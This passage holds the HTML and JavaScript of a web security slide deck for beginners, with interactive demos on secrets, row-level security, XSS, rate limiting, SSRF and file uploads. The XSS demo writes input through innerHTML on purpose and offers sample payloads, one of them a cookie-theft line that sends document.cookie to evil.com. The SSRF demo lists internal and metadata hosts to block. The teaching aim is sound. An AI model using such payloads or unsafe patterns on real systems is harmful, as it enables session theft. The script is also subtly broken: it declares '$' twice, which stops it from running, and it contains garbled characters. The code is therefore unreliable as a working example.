          <span class="toc-number">4</span>
          <span class="toc-title">How to Talk to Your AI</span>
        </div>
        <div class="toc-item" data-slide="secrets">
          <span class="toc-number">5</span>
          <span class="toc-title">Secrets Management</span>
        </div>
        <div class="toc-item" data-slide="rls">
          <span class="toc-number">6</span>
          <span class="toc-title">Data Access (RLS)</span>
        </div>
        <div class="toc-item" data-slide="xss-demo">
          <span class="toc-number">7</span>
          <span class="toc-title">Input Validation & XSS</span>
        </div>
        <div class="toc-item" data-slide="api-limits">
          <span class="toc-number">8</span>
          <span class="toc-title">API Surface & Rate Limiting</span>
        </div>
        <div class="toc-item" data-slide="cors-headers">
          <span class="toc-number">9</span>
          <span class="toc-title">CORS & Headers</span>
        </div>
        <div class="toc-item" data-slide="storage">
          <span class="toc-number">10</span>
          <span class="toc-title">Storage & File Uploads</span>
        </div>
        <div class="toc-item" data-slide="server-calls">
          <span class="toc-number">11</span>
          <span class="toc-title">Server‚ÄëSide API Calls</span>
        </div>
        <div class="toc-item" data-slide="vuln-classes">
          <span class="toc-number">12</span>
          <span class="toc-title">Vulnerability Classes</span>
        </div>
        <div class="toc-item" data-slide="keep-current">
          <span class="toc-number">13</span>
          <span class="toc-title">Keep It Current</span>
        </div>
        <div class="toc-item" data-slide="rls-testing">
          <span class="toc-number">14</span>
          <span class="toc-title">RLS Testing in 3 Steps</span>
        </div>
        <div class="toc-item" data-slide="checklist">
          <span class="toc-number">15</span>
          <span class="toc-title">10‚ÄëMinute Hardening Checklist</span>
        </div>
        <div class="toc-item" data-slide="resources">
          <span class="toc-number">16</span>
          <span class="toc-title">Resources & Next Steps</span>
        </div>
      </div>
    </div>

    <script>
// Minimal client script: progress and navigation (light mode only)

const $ = (sel, ctx = document) => ctx.querySelector(sel);
const $ = (sel, ctx = document) => Array.from(ctx.querySelectorAll(sel));
const getScroller = () => document.getElementById('content');

// Slide configuration
const SLIDES = [
  { id: 'intro', file: '01-intro.html', title: 'How To Vibe Secure' },
  { id: 'mindset', file: '02-mindset.html', title: 'Mindset: Default‚ÄëDeny' },
  { id: 'frontend-backend', file: '03-frontend-backend.html', title: 'Frontend vs Backend' },
  { id: 'ai-prompts', file: '04-ai-prompts.html', title: 'How to Talk to Your AI' },
  { id: 'secrets', file: '05-secrets.html', title: 'Secrets Management' },
  { id: 'rls', file: '06-rls.html', title: 'Data Access (RLS)' },
  { id: 'xss-demo', file: '07-xss-demo.html', title: 'Input Validation & XSS' },
  { id: 'api-limits', file: '08-api-limits.html', title: 'API Surface & Rate Limiting' },
  { id: 'cors-headers', file: '09-cors-headers.html', title: 'CORS & Headers' },
  { id: 'storage', file: '10-storage.html', title: 'Storage & File Uploads' },
  { id: 'server-calls', file: '11-server-calls.html', title: 'Server‚ÄëSide API Calls' },
  { id: 'vuln-classes', file: '12-vuln-classes.html', title: 'Vulnerability Classes' },
  { id: 'keep-current', file: '13-keep-current.html', title: 'Keep It Current' },
  { id: 'rls-testing', file: '14-rls-testing.html', title: 'RLS Testing in 3 Steps' },
  { id: 'checklist', file: '15-checklist.html', title: '10‚ÄëMinute Hardening Checklist' },
  { id: 'resources', file: '16-resources.html', title: 'Resources & Next Steps' }
];

function getSections() {
  return $('.slide');
}

function nextSection(dir = 1) {
  const scroller = getScroller();
  const sections = getSections();
  const pos = (scroller?.scrollTop || 0) + 1; // nudge to avoid edge rounding
  let currentIndex = sections.findIndex(s => {
    const top = s.offsetTop;
    const bottom = top + s.offsetHeight;
    return pos >= top && pos < bottom;
  });
  if (currentIndex === -1) currentIndex = 0;
  const target = sections[Math.min(Math.max(currentIndex + dir, 0), sections.length - 1)];
  if (scroller && target) {
    scroller.scrollTo({ top: target.offsetTop, behavior: 'smooth' });
    target.focus({ preventScroll: true });
  }
}

function initProgress() {
  const scroller = getScroller();
  const sections = getSections;
  const currentSlideSpan = $('#currentSlide');
  const totalSlidesSpan = $('#totalSlides');
  
  // Update total slides count
  if (totalSlidesSpan) totalSlidesSpan.textContent = SLIDES.length;
  
  const onScroll = () => {
    const scrolled = scroller?.scrollTop || 0;
    const allSections = getSections();
    
    // Determine current section index for slide indicator
    let idx = 0;
    for (let i = 0; i < allSections.length; i++) {
      const section = allSections[i];
      const sectionTop = section.offsetTop;
      const sectionBottom = sectionTop + (section.offsetHeight * 0.5); // Use midpoint
      
      if (scrolled >= sectionTop && scrolled < sectionBottom) {
        idx = i;
        break;
      } else if (scrolled >= sectionTop) {
        idx = i; // Fallback for last section
      }
    }
    
    // Update slide indicator
    if (currentSlideSpan) currentSlideSpan.textContent = idx + 1;
    
    // Update table of contents active item
    updateTOCActive(idx);
  };
  
  scroller?.addEventListener('scroll', onScroll, { passive: true });
  onScroll();
  
  // Check content overflow on load and resize
  checkContentOverflow();
  window.addEventListener('resize', checkContentOverflow, { passive: true });
}

function checkContentOverflow() {
  const slides = getSections();
  slides.forEach(slide => {
    // Reset classes
    slide.classList.remove('overflow-content', 'scale-content');
    
    // Check if content is taller than viewport
    const slideHeight = slide.offsetHeight;
    const viewportHeight = window.innerHeight;
    const contentHeight = slide.scrollHeight;
    
    if (contentHeight > viewportHeight * 0.95) {
      // If content is very tall, try scaling first
      if (contentHeight > viewportHeight * 1.2) {
        slide.classList.add('scale-content');
        // Re-check after scaling
        setTimeout(() => {
          if (slide.scrollHeight > viewportHeight * 0.98) {
            slide.classList.add('overflow-content');
          }
        }, 100);
      } else {
        slide.classList.add('overflow-content');
      }
    }
  });
}

function initKeyboardNav() {
  window.addEventListener('keydown', (e) => {
    if (['INPUT', 'TEXTAREA'].includes((e.target && e.target.tagName) || '')) return;
    if (e.key === 'j' || e.key === 'ArrowDown' || e.key === 'PageDown' || e.key === ' ') {
      e.preventDefault();
      nextSection(1);
    }
    if (e.key === 'k' || e.key === 'ArrowUp' || e.key === 'PageUp') {
      e.preventDefault();
      nextSection(-1);
    }
    if (e.key === 'Home') {
      e.preventDefault();
      getSections()[0]?.scrollIntoView({ behavior: 'smooth' });
    }
    if (e.key === 'End') {
      e.preventDefault();
      const s = getSections();
      s[s.length - 1]?.scrollIntoView({ behavior: 'smooth' });
    }
  });
}

function initSnapWheel() {
  const scroller = getScroller();
  if (!scroller) return;
  let animating = false;
  let accum = 0;
  let targetTop = null;
  const reset = () => { animating = false; targetTop = null; accum = 0; };
  const onWheel = (e) => {
    // Ignore if user is using horizontal scroll or holding modifiers
    if (Math.abs(e.deltaY) < Math.abs(e.deltaX)) return;
    accum += e.deltaY;
    if (animating) { e.preventDefault(); return; }
    const threshold = 40; // minimal intent to move a slide
    if (Math.abs(accum) > threshold) {
      e.preventDefault();
      const dir = accum > 0 ? 1 : -1;
      accum = 0;
      const sections = getSections();
      // Find current index by nearest offsetTop <= scrollTop
      let idx = 0;
      for (let i = 0; i < sections.length; i++) {
        if ((scroller.scrollTop + 1) >= sections[i].offsetTop) idx = i; else break;
      }
      const nextIdx = Math.min(Math.max(idx + dir, 0), sections.length - 1);
      const target = sections[nextIdx];
      if (!target) return;
      animating = true;
      targetTop = target.offsetTop;
      scroller.scrollTo({ top: targetTop, behavior: 'smooth' });
      // Fallback timer in case 'scroll' doesn't settle
      setTimeout(reset, 600);
    }
  };
  const onScroll = () => {
    if (targetTop == null) return;
    const diff = Math.abs(scroller.scrollTop - targetTop);
    if (diff < 2) reset();
  };
  scroller.addEventListener('wheel', onWheel, { passive: false });
  scroller.addEventListener('scroll', onScroll, { passive: true });
}

function initTOC() {
  const tocItems = $('.toc-item');
  const scroller = getScroller();
  const toc = $('#tableOfContents');
  const slideIndicator = $('#slideIndicator');
  
  // Handle TOC item clicks
  tocItems.forEach(item => {
    item.addEventListener('click', () => {
      const slideId = item.dataset.slide;
      const targetSlide = $(`#${slideId}`);
      if (targetSlide && scroller) {
        scroller.scrollTo({ top: targetSlide.offsetTop, behavior: 'smooth' });
      }
    });
  });
  
  if (toc && slideIndicator) {
    let hideTimeout;
    
    function showTOC() {
      clearTimeout(hideTimeout);
      toc.classList.add('show');
    }
    
    function hideTOC() {
      clearTimeout(hideTimeout);
      hideTimeout = setTimeout(() => {
        toc.classList.remove('show');
      }, 200);
    }
    
    // Show TOC when hovering slide indicator
    slideIndicator.addEventListener('mouseenter', showTOC);
    slideIndicator.addEventListener('mouseleave', hideTOC);
    
    // Keep TOC open when hovering over it
    toc.addEventListener('mouseenter', () => {
      clearTimeout(hideTimeout);
    });
    
    toc.addEventListener('mouseleave', hideTOC);
  }
}

function updateTOCActive(currentIndex) {
  const tocItems = $('.toc-item');
  tocItems.forEach((item, i) => {
    item.classList.toggle('active', i === currentIndex);
  });
}

// Slide content embedded to avoid CORS issues with file://
const SLIDE_CONTENT = {};

async function loadSlides() {
  const content = $('#content');
  if (!content) return;

  // Check if slides are already embedded in DOM or if we need to load them
  const existingSlides = $('.slide');
  if (existingSlides.length > 0) {
    // Slides already loaded, just init demos
    if (typeof initAllDemos === 'function') {
      initAllDemos();
    }
    initProgress();
    return;
  }

  // If running from file://, try to load via script tags or fallback
  // For now, show error message with instructions
  content.innerHTML = `
    <section class="slide" id="error" data-color="red" tabindex="-1">
      <h2>‚ö†Ô∏è Loading Issue</h2>
      <p>The multi-file structure requires a web server to work properly.</p>
      <h3>Solutions:</h3>
      <ul>
        <li><strong>Option 1:</strong> Run <code>python3 -m http.server 8001</code> and visit <code>http://localhost:8001</code></li>
        <li><strong>Option 2:</strong> Use the original single-file version for direct file:// access</li>
        <li><strong>Option 3:</strong> Use VS Code Live Server extension</li>
      </ul>
      <p><em>The slides are in individual files for parallel development, but need a server to load.</em></p>
    </section>
  `;
  
  // Initialize progress with error slide
  initProgress();
}

function main() {
  // Load slides first, then initialize everything else
  loadSlides().then(() => {
    initKeyboardNav();
    initSnapWheel();
    initTOC();
    initViewportStabilization();
    
    // Auto-show timeline on interaction
    let uiTimer = null;
    const wakeUI = () => {
      document.body.setAttribute('data-ui-awake', 'true');
      clearTimeout(uiTimer);
      uiTimer = setTimeout(() => document.body.setAttribute('data-ui-awake', 'false'), 1500);
    };
    ['mousemove','keydown','touchstart','wheel'].forEach(ev => window.addEventListener(ev, wakeUI, { passive: true }));
    window.addEventListener('keydown', (e) => {
      if (e.key === 'Escape') {
        /* nothing to close now */
      }
    });
  });
}

function initViewportStabilization() {
  const scroller = getScroller();
  if (!scroller) return;
  
  // Disable browser scroll restoration
  if ('scrollRestoration' in history) {
    history.scrollRestoration = 'manual';
  }
  
  let currentSlideIndex = 0;
  let isResizing = false;
  let resizeTimeout = null;
  
  // Track current slide index based on scroll position
  const updateCurrentSlide = () => {
    if (isResizing) return; // Don't update during resize
    
    const sections = getSections();
    const scrolled = scroller.scrollTop + 1; // Small offset for edge cases
    
    for (let i = 0; i < sections.length; i++) {
      const section = sections[i];
      const sectionTop = section.offsetTop;
      const sectionBottom = sectionTop + section.offsetHeight;
      
      if (scrolled >= sectionTop && scrolled < sectionBottom) {
        currentSlideIndex = i;
        break;
      }
    }
  };
  
  // Handle resize start - disable snap immediately
  const handleResizeStart = () => {
    if (isResizing) return;
    
    isResizing = true;
    scroller.classList.add('no-snap');
    
    // Clear any existing timeout
    clearTimeout(resizeTimeout);
  };
  
  // Handle resize end - restore position and re-enable snap
  const handleResizeEnd = () => {
    clearTimeout(resizeTimeout);
    resizeTimeout = setTimeout(() => {
      const sections = getSections();
      const targetSection = sections[currentSlideIndex];
      
      if (targetSection) {
        // Scroll to the correct slide without animation
        scroller.scrollTo({
          top: targetSection.offsetTop,
          behavior: 'auto'
        });
        
        // Re-enable snap after a brief delay
        setTimeout(() => {
          scroller.classList.remove('no-snap');
          isResizing = false;
        }, 50);
      } else {
        scroller.classList.remove('no-snap');
        isResizing = false;
      }
      
      // Update content overflow after stabilization
      setTimeout(() => {
        checkContentOverflow();
      }, 100);
    }, 150); // Debounce resize events
  };
  
  // Listen for scroll to track current slide
  scroller.addEventListener('scroll', updateCurrentSlide, { passive: true });
  
  // Listen for resize events
  window.addEventListener('resize', () => {
    handleResizeStart();
    handleResizeEnd();
  }, { passive: true });
  
  // Initialize current slide
  updateCurrentSlide();
}

document.addEventListener('DOMContentLoaded', main);
// Slide demo functions

// Frontend vs Backend Demo
function initFrontendBackendDemo() {
  const checkoutBtn = document.getElementById('checkoutBtn');
  if (!checkoutBtn) return;

  let attempts = 0;
  
  checkoutBtn.addEventListener('click', () => {
    attempts++;
    const status = document.querySelector('#frontendBackendDemo .demo-status');
    
    if (checkoutBtn.disabled) {
      // This shouldn't happen normally, but DevTools can bypass
      status.innerHTML = `<span class="warning">‚ö†Ô∏è Button was disabled, but click went through! (Attempt ${attempts})</span>`;
    } else {
      status.innerHTML = `<span class="success">‚úÖ Server validated: Payment processed! But in real life, server should check permissions regardless of UI state. (Attempt ${attempts})</span>`;
    }
    
    // Show the security lesson
    setTimeout(() => {
      status.innerHTML += `<br><strong>Security lesson:</strong> Always validate on the server, never trust the client!`;
    }, 1000);
  });

  // Show instructions
  const instructions = document.createElement('div');
  instructions.className = 'demo-instructions';
  instructions.innerHTML = `
    <p><strong>Try this:</strong></p>
    <ol>
      <li>Right-click the button ‚Üí Inspect Element</li>
      <li>Remove the <code>disabled</code> attribute</li>
      <li>Click the button</li>
    </ol>
  `;
  checkoutBtn.parentNode.appendChild(instructions);
}

// Secrets Scanner Demo
function initSecretsDemo() {
  const secretInfo = document.querySelector('#secretsDemo .secret-info');
  if (!secretInfo) return;

  const secretData = {
    'supabase-public': {
      title: 'Supabase Anon Key',
      location: '‚úÖ SAFE with VITE_',
      explanation: 'Public by design. Use VITE_ prefix so it gets bundled to frontend. Protected by RLS policies.',
      example: 'VITE_SUPABASE_ANON_KEY=eyJh...VCJ9',
      color: 'success'
    },
    'supabase-service': {
      title: 'Supabase Service Role Key',
      location: 'üö® NO VITE_ PREFIX',
      explanation: 'Bypasses all RLS! Keep in server .env file only (no VITE_ prefix).',
      example: 'SUPABASE_SERVICE_ROLE_KEY=eyJh...VCJ9',
      color: 'error'
    },
    'stripe-public': {
      title: 'Stripe Public Key',
      location: '‚úÖ SAFE with VITE_',
      explanation: 'Starts with pk_. Can only create payment intents, not charge. Use VITE_ prefix.',
      example: 'VITE_STRIPE_PUBLIC_KEY=pk_test_51H...',
      color: 'success'
    },
    'stripe-secret': {
      title: 'Stripe Secret Key',
      location: 'üö® NO VITE_ PREFIX',
      explanation: 'Starts with sk_. Can charge cards! Keep server-only (no VITE_ prefix).',
      example: 'STRIPE_SECRET_KEY=sk_test_51H...',
      color: 'error'
    },
    'google-maps': {
      title: 'Google Maps API Key',
      location: '‚ö†Ô∏è VITE_ + domain restrictions',
      explanation: 'Can use VITE_ prefix BUT must restrict to your domain in Google Console.',
      example: 'VITE_GOOGLE_MAPS_KEY=AIza...WK',
      color: 'warning'
    },
    'jwt-secret': {
      title: 'JWT Signing Secret',
      location: 'üö® NO VITE_ PREFIX',
      explanation: 'Signs auth tokens. If leaked, anyone can fake users! Server .env only.',
      example: 'JWT_SECRET=your-256-bit...',
      color: 'error'
    }
  };

  window.showSecretInfo = function(secretType) {
    const data = secretData[secretType];
    if (!data) return;

    // Clear previous selections
    document.querySelectorAll('.secret-card').forEach(card => {
      card.classList.remove('selected');
    });
    
    // Mark current selection
    document.querySelector(`[data-secret="${secretType}"]`).classList.add('selected');

    secretInfo.innerHTML = `
      <div class="secret-details ${data.color}">
        <h4>${data.title}</h4>
        <div class="location">${data.location}</div>
        <p>${data.explanation}</p>
        <div class="example">
          <strong>Example:</strong>
          <code>${data.example}</code>
        </div>
      </div>
    `;
  };
}

// RLS Demo
function initRLSDemo() {
  let databaseRecords = []; // All records in the "database"
  let recordIdCounter = 1;
  
  const dataInput = document.querySelector('#rlsDemo #dataInput');
  const dataOwner = document.querySelector('#rlsDemo #dataOwner');
  const tableBody = document.querySelector('#rlsDemo #tableBody');
  const currentUser = document.querySelector('#rlsDemo #currentUser');
  const rlsEnabled = document.querySelector('#rlsDemo #rlsEnabled');
  const resultsBody = document.querySelector('#rlsDemo #resultsBody');
  const sqlDisplay = document.querySelector('#rlsDemo #sqlDisplay');
  const securityWarning = document.querySelector('#rlsDemo #securityWarning');
  const resultsTitle = document.querySelector('#rlsDemo #resultsTitle');
  
  if (!dataInput || !tableBody) return;

  function formatTime(date) {
    return date.toLocaleTimeString('en-US', { 
      hour12: false, 
      hour: '2-digit', 
      minute: '2-digit',
      second: '2-digit'
    });
  }

  function updateDatabaseTable() {
    tableBody.innerHTML = databaseRecords.map(record => 
      `<tr>
        <td>${record.id}</td>
        <td>${record.owner}</td>
        <td>${record.data}</td>
        <td>${formatTime(record.created)}</td>
      </tr>`
    ).join('');
  }

  function updateQueryResults() {
    const user = currentUser.value;
    const rlsOn = rlsEnabled.checked;
    
    let visibleRecords;
    let sqlQuery;
    
    if (rlsOn) {
      // RLS filters automatically
      visibleRecords = databaseRecords.filter(record => record.owner === user);
      sqlQuery = `SELECT * FROM notes WHERE owner = '${user}'; -- RLS automatically adds this filter`;
    } else {
      // No RLS - all records visible (security vulnerability!)
      visibleRecords = databaseRecords;
      sqlQuery = `SELECT * FROM notes; -- ‚ö†Ô∏è NO FILTERING - ALL DATA EXPOSED!`;
    }
    
    // Update SQL display
    sqlDisplay.innerHTML = `<code>${sqlQuery}</code>`;
    
    // Update results table
    resultsBody.innerHTML = visibleRecords.map((record, index) => {
      const isOwnRecord = record.owner === user;
      const rowClass = rlsOn ? (isOwnRecord ? 'accessible' : 'blocked') : (isOwnRecord ? 'own-record' : 'exposed-record');
      
      return `<tr class="${rowClass}">
        <td>${record.id}</td>
        <td>${record.owner}</td>
        <td>${record.data}</td>
        <td>${formatTime(record.created)}</td>
      </tr>`;
    }).join('');
    
    // Update title and warnings
    if (rlsOn) {
      resultsTitle.textContent = `Query Results (${visibleRecords.length} rows) - RLS Protected`;
      securityWarning.style.display = 'none';
    } else {
      resultsTitle.textContent = `Query Results (${visibleRecords.length} rows) - NO RLS PROTECTION`;
      const exposedRecords = visibleRecords.filter(record => record.owner !== user);
      if (exposedRecords.length > 0) {
        securityWarning.style.display = 'block';
        securityWarning.innerHTML = `
          <strong>üö® SECURITY VULNERABILITY!</strong><br>
          User "${user}" can see ${exposedRecords.length} record(s) belonging to other users!<br>
          This is why RLS is essential for data protection.
        `;
      } else {
        securityWarning.style.display = 'none';
      }
    }
  }

  window.addDatabaseRecord = function() {
    if (!dataInput || !dataOwner) return;
    const data = dataInput.value.trim();
    if (!data) return;
    
    const record = {
      id: recordIdCounter++,
      owner: dataOwner.value,
      data: data,
      created: new Date()
    };
    
    databaseRecords.push(record);
    dataInput.value = '';
    
    updateDatabaseTable();
    // Don't auto-update query results - user must click query button
  };

  window.runQuery = function() {
    updateQueryResults();
  };

  window.resetDatabase = function() {
    databaseRecords = [];
    recordIdCounter = 1;
    updateDatabaseTable();
    
    // Reset query results to initial state
    resultsTitle.textContent = 'Query Results';
    sqlDisplay.innerHTML = '<code>Click "SELECT * FROM notes" to run query</code>';
    resultsBody.innerHTML = '<tr><td colspan="4" style="text-align: center; color: var(--text-muted); font-style: italic;">No query executed yet</td></tr>';
    securityWarning.style.display = 'none';
  };

  // Add Enter key support
  if (dataInput) {
    dataInput.addEventListener('keypress', (e) => {
      if (e.key === 'Enter') {
        addDatabaseRecord();
      }
    });
  }

  // Remove real-time updates - only update when query button is clicked

  // Initialize with some sample data
  databaseRecords = [
    { id: 1, owner: 'User A', data: 'My secret project notes', created: new Date(Date.now() - 120000) },
    { id: 2, owner: 'User B', data: 'Personal diary entry', created: new Date(Date.now() - 60000) }
  ];
  recordIdCounter = 3;
  
  updateDatabaseTable();
  
  // Initialize query results area with prompt to run query
  resultsTitle.textContent = 'Query Results';
  sqlDisplay.innerHTML = '<code>Click "SELECT * FROM notes" to run query</code>';
  resultsBody.innerHTML = '<tr><td colspan="4" style="text-align: center; color: var(--text-muted); font-style: italic;">No query executed yet</td></tr>';
  securityWarning.style.display = 'none';
}

// XSS Demo (Enhanced from existing)
function initXSSDemo() {
  const input = document.getElementById('xssInput');
  const output = document.getElementById('xssOut');
  const btnInsecure = document.getElementById('btnInsecure');
  const btnSecure = document.getElementById('btnSecure');
  const btnClear = document.getElementById('btnClear');
  
  if (!input || !output) return;

  btnInsecure?.addEventListener('click', () => {
    // Intentionally unsafe for demo
    const userInput = input.value;
    output.innerHTML = userInput;
    output.className = 'xss-output insecure';
    
    // Simulate XSS execution for demo purposes
    // Check if input contains XSS patterns and simulate their execution
    if (userInput.includes('<script>') || userInput.includes('onerror=') || userInput.includes('onload=') || userInput.includes('document.cookie') || userInput.includes('fetch(')) {
      // Add visual indicator that XSS would have executed
      setTimeout(() => {
        // Show XSS execution warning
        const xssWarning = document.createElement('div');
        xssWarning.className = 'xss-executed';
        
        // Check if it's a cookie theft attack for specific warning
        let warningMessage = 'üö® XSS EXECUTED! In a real app, malicious code would run here! üö®';
        if (userInput.includes('document.cookie') || userInput.includes('fetch(')) {
          warningMessage = 'üç™ COOKIE THEFT ATTACK! Session cookies would be stolen and sent to evil.com! üö®';
        }
        
        xssWarning.innerHTML = warningMessage;
        xssWarning.style.cssText = `
          background: red; 
          color: white; 
          padding: 10px; 
          border: 2px solid darkred; 
          border-radius: 5px; 
          margin: 10px 0; 
          animation: pulse 1s infinite;
          font-weight: bold;
        `;
        output.appendChild(xssWarning);
        
        // Simulate page background flash
        document.body.style.backgroundColor = '#ff000033';
        setTimeout(() => {
          document.body.style.backgroundColor = '';
        }, 1000);
        
        // Show alert after visual effects
        setTimeout(() => {
          alert('üö® XSS Attack Simulated! In a real application, malicious JavaScript would have executed.');
        }, 500);
        
      }, 100);
    }
  });

  btnSecure?.addEventListener('click', () => {
    // Safe text content
    output.textContent = input.value;
    output.className = 'xss-output secure';
  });

  btnClear?.addEventListener('click', () => {
    input.value = '';
    output.textContent = '';
    output.className = '';
  });

  // Add sample XSS payloads
  const samplesDiv = document.createElement('div');
  samplesDiv.className = 'xss-samples';
  samplesDiv.innerHTML = `
    <details>
      <summary>‚ñº Sample XSS Payloads (for testing)</summary>
      <div class="sample-buttons">
        <button type="button" data-payload="image">Image XSS</button>
        <button type="button" data-payload="script">Script Tag</button>
        <button type="button" data-payload="svg">SVG XSS</button>
        <button type="button" data-payload="cookie">Cookie Theft</button>
      </div>
    </details>
  `;
  
  // Add event listeners for sample buttons
  const sampleButtons = samplesDiv.querySelectorAll('button[data-payload]');
  sampleButtons.forEach(btn => {
    btn.addEventListener('click', () => {
      const payload = btn.dataset.payload;
      switch(payload) {
        case 'image':
          input.value = '<img src=x onerror="this.style.backgroundColor=\'red\'; this.style.width=\'200px\'; this.style.height=\'50px\'; this.innerHTML=\'üö® XSS EXECUTED! üö®\';">';
          break;
        case 'script':
          input.value = '<script>document.body.style.backgroundColor="red"; setTimeout(() => document.body.style.backgroundColor="", 2000);</script>';
          break;
        case 'svg':
          input.value = '<svg onload="this.innerHTML=\'<text x=10 y=20 fill=red>üö® XSS EXECUTED! üö®</text>\'; this.style.backgroundColor=\'yellow\';" width="200" height="30">';
          break;
        case 'cookie':
          input.value = '<img src=x onerror="fetch(\'https://evil.com/steal?cookie=\' + document.cookie)">';
          break;
      }
    });
  });
  
  input.parentNode.appendChild(samplesDiv);
}

// Rate Limiting Demo
function initRateLimitDemo() {
  const log = document.querySelector('#rateLimitDemo .request-log');
  if (!log) return;

  let requestCount = 0;
  let isLimited = false;
  const RATE_LIMIT = 5;
  const WINDOW_MS = 10000; // 10 seconds

  window.makeRequest = function() {
    requestCount++;
    
    if (requestCount > RATE_LIMIT && !isLimited) {
      isLimited = true;
      setTimeout(() => {
        isLimited = false;
        requestCount = 0;
      }, WINDOW_MS);
    }

    const timestamp = new Date().toLocaleTimeString();
    const status = isLimited ? '429 Too Many Requests' : '200 OK';
    const statusClass = isLimited ? 'error' : 'success';
    
    const logEntry = `
      <div class="log-entry ${statusClass}">
        [${timestamp}] Request ${requestCount}: ${status}
      </div>
    `;
    
    log.innerHTML = logEntry + log.innerHTML;
    
    // Limit log entries
    const entries = log.children;
    if (entries.length > 10) {
      entries[entries.length - 1].remove();
    }
  };

  window.floodRequests = function() {
    for (let i = 0; i < 10; i++) {
      setTimeout(() => makeRequest(), i * 100);
    }
  };

  window.resetLimits = function() {
    requestCount = 0;
    isLimited = false;
    log.innerHTML = '<p class="info">Rate limits reset!</p>';
  };
}

// Headers Demo
function initHeadersDemo() {
  window.checkHeaders = function() {
    const output = document.querySelector('#headersDemo .headers-output');
    if (!output) return;

    // Simulate checking headers (in real app, this would be a fetch)
    const mockHeaders = {
      'Content-Security-Policy': 'default-src \'self\'; script-src \'self\' \'unsafe-inline\'',
      'Strict-Transport-Security': 'max-age=31536000; includeSubDomains',
      'X-Frame-Options': 'DENY',
      'X-Content-Type-Options': 'nosniff',
      'Referrer-Policy': 'strict-origin-when-cross-origin',
      'Access-Control-Allow-Origin': window.location.origin
    };

    const headersHtml = Object.entries(mockHeaders).map(([key, value]) => `
      <div class="header-item">
        <strong>${key}:</strong><br>
        <code>${value}</code>
      </div>
    `).join('');

    output.innerHTML = `
      <div class="headers-list">
        <h4>Current Security Headers:</h4>
        ${headersHtml}
      </div>
    `;
  };
}

// File Upload Demo
function initUploadDemo() {
  const fileInput = document.getElementById('fileInput');
  const uploadStatus = document.querySelector('#uploadDemo .upload-status');
  const validationResults = document.querySelector('#uploadDemo .validation-results');
  
  if (!fileInput || !uploadStatus || !validationResults) return;

  const ALLOWED_TYPES = ['image/jpeg', 'image/png', 'image/gif', 'text/plain', 'application/pdf'];
  const MAX_SIZE = 5 * 1024 * 1024; // 5MB

  fileInput.addEventListener('change', (e) => {
    const file = e.target.files[0];
    if (!file) return;

    uploadStatus.innerHTML = `<p>Validating file: <strong>${file.name}</strong></p>`;
    
    const validations = [];
    
    // Type validation
    if (ALLOWED_TYPES.includes(file.type)) {
      validations.push({ check: 'File type', status: 'pass', message: `${file.type} is allowed` });
    } else {
      validations.push({ check: 'File type', status: 'fail', message: `${file.type} is not allowed` });
    }
    
    // Size validation
    if (file.size <= MAX_SIZE) {
      validations.push({ check: 'File size', status: 'pass', message: `${(file.size / 1024 / 1024).toFixed(2)} MB is within limit` });
    } else {
      validations.push({ check: 'File size', status: 'fail', message: `${(file.size / 1024 / 1024).toFixed(2)} MB exceeds 5MB limit` });
    }
    
    // Extension check
    const ext = file.name.split('.').pop().toLowerCase();
    const suspiciousExts = ['exe', 'bat', 'cmd', 'com', 'pif', 'scr', 'vbs', 'js', 'jar'];
    if (suspiciousExts.includes(ext)) {
      validations.push({ check: 'File extension', status: 'fail', message: `${ext} files are blocked for security` });
    } else {
      validations.push({ check: 'File extension', status: 'pass', message: `${ext} extension is safe` });
    }

    const allPassed = validations.every(v => v.status === 'pass');
    
    validationResults.innerHTML = `
      <div class="validation-summary ${allPassed ? 'success' : 'error'}">
        ${allPassed ? '‚úÖ File would be accepted' : '‚ùå File would be rejected'}
      </div>
      <div class="validation-details">
        ${validations.map(v => `
          <div class="validation-item ${v.status}">
            <strong>${v.check}:</strong> ${v.message}
          </div>
        `).join('')}
      </div>
    `;
  });
}

// SSRF Protection Demo
function initSSRFDemo() {
  window.testSSRF = function(button) {
    const input = button.previousElementSibling;
    const results = document.querySelector('#ssrfDemo .ssrf-results');
    const url = input.value;
    
    if (!url) {
      results.innerHTML = '<p class="warning">Please enter a URL to test!</p>';
      return;
    }

    // Simulate SSRF protection
    const blocked = [
      'localhost',
      '127.0.0.1',
      '169.254.169.254', // AWS metadata
      '0.0.0.0',
      '10.',
      '192.168.',
      '172.16.',
      '172.17.',
      '172.18.',
      '172.19.',
      '172.20.',
      '172.21.',
      '172.22.',
      '172.23.',
      '172.24.',
      '172.25.',
      '172.26.',
      '172.27.',
      '172.28.',
      '172.29.',
      '172.30.',
      '172.31.'
    ];

    const isBlocked = blocked.some(pattern => url.includes(pattern));
    
    if (isBlocked) {
      results.innerHTML = `
        <div class="ssrf-result error">
          ‚ùå Request blocked: URL targets private/internal network
          <br><strong>Blocked URL:</strong> <code>${url}</code>
          <br><em>This protects against SSRF attacks</em>
        </div>
      `;
    } else {
      results.innerHTML = `
        <div class="ssrf-result success">
          ‚úÖ Request would be allowed: URL targets public internet
          <br><strong>URL:</strong> <code>${url}</code>
          <br><em>Remember to also validate response content and implement timeouts</em>
        </div>
      `;
    }
  };

  // Add sample dangerous URLs
  const container = document.querySelector('#ssrfDemo');
  const samples = document.createElement('div');
  samples.className = 'ssrf-samples';
  samples.innerHTML = `
    <p><strong>Try these:</strong></p>
    <div class="sample-buttons">
      <button onclick="document.querySelector('#ssrfDemo input').value = 'http://169.254.169.254/latest/meta-data/'">AWS Metadata</button>
      <button onclick="document.querySelector('#ssrfDemo input').value = 'http://localhost:3000/admin'">Localhost</button>
      <button onclick="document.querySelector('#ssrfDemo input').value = 'https://example.com/api'">Safe External</button>
    </div>
  `;
  container.appendChild(samples);
}

// RLS Testing Demo
function initRLSTestingDemo() {
  window.runRLSTest = function() {
    const output = document.querySelector('#rlsTestDemo .test-output');
    if (!output) return;

    output.innerHTML = '<div class="loading">Running RLS tests...</div>';
    
    // Simulate the 3-step test
    const steps = [
      { step: 1, description: 'Creating test users A and B...', delay: 1000 },
      { step: 2, description: 'Testing User A permissions...', delay: 2000 },
      { step: 3, description: 'Testing User B permissions...', delay: 3000 },
      { step: 4, description: 'Analyzing results...', delay: 4000 }
    ];

    steps.forEach(({ step, description, delay }) => {
      setTimeout(() => {
        if (step < 4) {
          output.innerHTML += `<div class="test-step">Step ${step}: ${description}</div>`;
        } else {
          // Final results
          const results = Math.random() > 0.5 ? 'pass' : 'fail';
          output.innerHTML += `
            <div class="test-results ${results}">
              <h4>Test Results:</h4>
              ${results === 'pass' ? `
                <div class="result-item success">‚úÖ User A can read/write own data</div>
